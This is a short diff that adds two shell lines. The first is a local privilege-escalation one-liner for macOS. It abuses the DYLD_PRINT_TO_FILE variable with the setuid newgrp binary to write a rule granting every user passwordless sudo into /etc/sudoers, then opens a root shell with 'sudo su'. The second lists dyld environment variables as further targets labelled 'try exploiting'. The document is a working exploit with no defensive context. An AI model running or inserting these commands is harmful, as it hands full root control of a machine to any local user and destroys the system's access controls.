@@ -1,0 +1,2 @@
+echo python -c '"import os;os.write(3,\"ALL ALL=(ALL) NOPASSWD: ALL\")"'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su
+strings /usr/lib/dyld | grep ^DYLD_ | sed -e 's/^/note to self: try exploiting /'
